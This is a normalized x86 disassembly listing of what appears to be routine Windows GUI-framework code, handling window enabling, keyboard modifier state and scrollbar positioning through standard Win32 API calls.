add ah bl
jpo r-xdata
0x65dc0046 0x46
or [ eax ] eax
test [ eax ] al
mov eax [ 0x42b02c00 ]
mov al 0x39
mov al 0xb
mov al 0xc5
add [ esi ] 0xf8
inc esi
add al dh
add eax 0x5f40045
inc ebp
add [ eax + 0x7e ] bl
inc esi
add [ esp + eax + 0x45 ] dl
add ah cl
xor [ ebp ] al
dec esp
test [ esi ] eax
rol [ edx + 0x45 ] 0x0
dec eax
sub eax 0x9a600045
inc esi
add ah ah
dec edi
inc esi
add [ edx + edx * 2 - 0x74bfffba ] dl
inc esi
add [ ebx + ebx * 2 + 0x46 ] bh
add al bh
pop ebx
inc esi
add [ eax - 0x62 ] al
inc esi
add [ eax + ebx * 2 - 0x66bbffba ] dh
sub_463dc0
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_463e0c
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46d5ec
mov eax [ rw-data ]
call sub_4211e8
mov eax [ rw-data ]
call sub_421190
retn
push 0x0
push eax
call ShowOwnedPopups
sub_463e44
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026cc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_463e94
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_463f37
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_403788#8
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_463e44
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463f3e
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_463f48
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4026ec
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_463f80
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_463fe4
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_463f80
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_464040
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_464060
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_464040
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_46408c
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_46ab28
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_46afe0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407ff4
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46ab14
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46afcc
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407ff4
test eax eax
je r-xdata
sub_464128
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_46417c
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_4641b8
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_464224
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_464282
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_461be8
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404220
mov eax [ ebp - 0x8 ]
pop edx
call sub_407ff4
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464289
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
sub_464294
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_4642bc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_46432d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_464294
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464334
lea eax [ ebp - 0xc ]
call sub_404038
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
call sub_403a74
sub_46433c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403278
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4643cc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418f24
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_464c94
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_464c74
mov edx [ edi + 0xc ]
mov eax ebx
call sub_464b24
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46441c
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4645d4
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_44cf38
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_464b24
xor edx edx
mov eax ebx
call sub_464b24
jmp r-xdata
sub_464454
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42be9c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_4644c0
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42be9c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_464528
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_464c5c
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44fde8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_464c5c
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_44fdac
call sub_4644c0
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_44fdac
call sub_464454
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_4645d4
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_4530b8
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_46460c
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4530b8
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_464640
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_46460c
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_46460c
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_4646bc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4530b8
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_464640
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44c278
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_464640
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44c2bc
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_464754
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4530b8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_4647b4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_464985 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_464b24
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_464b24
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4646bc
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_464b24
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4646bc
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_464b24
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_464b24
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_464b24
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_464b24
jmp r-xdata
push ebp
call sub_464754
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_464b24
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_464b24
jmp r-xdata
push ebp
call sub_464754
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_464b24
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406c9c
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_464b24
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_464b24
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_464b24
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_464b24
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_464b24
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_464b24
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_464b24
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_464b24
jmp r-xdata
sub_464aac
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_46519c
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_464b24
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_4530b8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_4530b8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_452c70
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_452c70
jmp r-xdata
call sub_464294
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_464be8
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_46519c
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_464ca0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4530b8
push eax
call sub_42df5c
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4530b8
push eax
call sub_42df5c
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4530b8
push eax
call sub_42df5c
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_423fe4
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4530b8
push eax
call sub_42df5c
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4530b8
push eax
call sub_42df5c
sub_464da8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_4646bc
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_4646bc
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_464ca0
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4530b8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_464b24
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_4646bc
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
